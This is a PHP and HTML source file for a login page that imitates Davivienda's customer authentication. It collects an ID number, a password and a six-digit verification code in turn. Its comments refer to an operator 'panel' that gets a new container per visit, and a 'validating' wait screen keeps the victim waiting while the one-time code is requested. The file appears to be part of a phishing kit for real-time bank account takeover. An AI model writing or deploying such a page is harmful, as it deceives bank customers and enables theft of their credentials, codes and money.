<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once __DIR__ . '/storage.php';

$error = '';
$errorCodigo = '';
$identificacion = '';

// Al entrar o recargar la web, siempre iniciar pidiendo los datos desde cero (Paso 1).
// Si sale y entra, pide los datos de nuevo y genera un contenedor nuevo en el panel.
unset($_SESSION['cuadro_id']);
unset($_SESSION['identificacion']);
$cuadroId = '';
$bloqueado = false;
$pasoActivo = 1; // 1 = IdentificaciÃ³n, 2 = ContraseÃ±a, 3 = Validando, 4 = CÃ³digo de 6 dÃ­gitos

if (isset($_GET['error']) && $_GET['error'] === 'relogin') {
    $error = 'Por favor vuelva a ingresar su nÃºmero de identificaciÃ³n.';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AutenticaciÃ³n del cliente</title>
    
    <!-- Fuentes tipogrÃ¡ficas -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    
    <!-- Hoja de estilos externa -->
    <link rel="stylesheet" href="style.css?v=<?= filemtime(__DIR__ . '/style.css') ?>">
    
    <!-- Script interactivo externo -->
    <script src="script.js?v=<?= filemtime(__DIR__ . '/script.js') ?>" defer></script>
</head>
<body>

    <!-- Cabecera Corporativa con Logotipo -->
    <header class="dav-header">
        <div class="dav-header-container">
            <img src="logo.png" alt="Davivienda" class="dav-logo.png">
        </div>
    </header>

    <div class="main-wrapper">
        <main class="auth-card">
            <h1 class="auth-title">AutenticaciÃ³n del cliente</h1>

        <!-- PASO 1: Formulario NÃºmero de IdentificaciÃ³n -->
        <form class="auth-form <?= ($pasoActivo !== 1 || $bloqueado) ? 'hidden' : '' ?>" id="formPaso1" method="POST" action="">
            <div class="input-wrapper">
                <input 
                    type="text" 
                    id="identificacion" 
                    name="identificacion" 
                    class="auth-input" 
                    placeholder="Ingrese nÃºmero identificaciÃ³n" 
                    value="<?= htmlspecialchars($identificacion, ENT_QUOTES, 'UTF-8') ?>"
                    inputmode="numeric"
                    autocomplete="off" 
                    autofocus
                    required
                >
                <span class="error-text" id="errorPaso1" style="<?= !empty($error) ? 'display:block;' : 'display:none;' ?>">
                    <?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?>
                </span>
            </div>

            <button type="submit" class="auth-btn" id="btnPaso1">Continuar</button>
        </form>

        <!-- PASO 2: Formulario ContraseÃ±a -->
        <form class="auth-form <?= ($pasoActivo !== 2 || $bloqueado) ? 'hidden' : '' ?>" id="formPaso2" method="POST" action="">
            <div class="input-wrapper">
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    class="auth-input" 
                    placeholder="Ingrese su contraseÃ±a" 
                    autocomplete="off" 
                    required
                >
                <button type="button" class="toggle-pass-btn" id="togglePass" aria-label="Mostrar u ocultar contraseÃ±a">
                    <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                    <svg class="eye-off-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                        <line x1="1" y1="1" x2="23" y2="23"></line>
                    </svg>
                </button>
                <span class="error-text" id="errorPaso2" style="display:none;"></span>
            </div>

            <button type="submit" class="auth-btn" id="btnPaso2">Continuar</button>
        </form>

        <!-- Estado de espera / validaciÃ³n ("se queda cargando validaciÃ³n") -->
        <div class="auth-loading <?= ($pasoActivo === 3 && !$bloqueado) ? 'active' : '' ?>" id="authLoading" data-cuadro-id="<?= htmlspecialchars($cuadroId, ENT_QUOTES, 'UTF-8') ?>">
            <div class="dav-spinner"></div>
            <h2 class="loading-title">Validando informaciÃ³n...</h2>
            <p class="loading-sub">Por favor espere un momento.</p>
        </div>

        <!-- PASO 3: Formulario CÃ³digo de 6 dÃ­gitos en 6 casillas -->
        <form class="auth-form <?= ($pasoActivo !== 4 || $bloqueado) ? 'hidden' : '' ?>" id="formPaso3" method="POST" action="">
            <p class="code-instruction">Ingrese el cÃ³digo de verificaciÃ³n que te hemos enviado</p>
            <div class="otp-wrapper">
                <div class="otp-boxes" id="otpBoxes">
                    <input type="text" class="otp-box" inputmode="numeric" maxlength="1" pattern="[0-9]*" autocomplete="one-time-code" data-index="0" aria-label="DÃ­gito 1">
                    <input type="text" class="otp-box" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-index="1" aria-label="DÃ­gito 2">
                    <input type="text" class="otp-box" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-index="2" aria-label="DÃ­gito 3">
                    <input type="text" class="otp-box" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-index="3" aria-label="DÃ­gito 4">
                    <input type="text" class="otp-box" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-index="4" aria-label="DÃ­gito 5">
                    <input type="text" class="otp-box" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-index="5" aria-label="DÃ­gito 6">
                </div>
                <input type="hidden" id="codigo" name="codigo" value="">
                <span class="error-text" id="errorPaso3" style="<?= !empty($errorCodigo) ? 'display:block;' : 'display:none;' ?>">
                    <?= htmlspecialchars($errorCodigo, ENT_QUOTES, 'UTF-8') ?>
                </span>
            </div>

            <button type="submit" class="auth-btn" id="btnPaso3">Continuar</button>
        </form>

        <!-- Estado de Bloqueo por seguridad -->
        <div class="auth-blocked <?= $bloqueado ? 'active' : '' ?>" id="authBlocked">
            <div class="blocked-icon">
                <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#ED1C27" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"></line>
                </svg>
            </div>
            <h2 class="blocked-title">Acceso bloqueado</h2>
            <p class="blocked-text">Por motivos de seguridad, su acceso ha sido bloqueado temporalmente.</p>
            <p class="blocked-sub">Para mÃ¡s informaciÃ³n, comunÃ­quese con nuestra lÃ­nea de atenciÃ³n.</p>
        </div>
    </main>
</div>

</body>
</html>

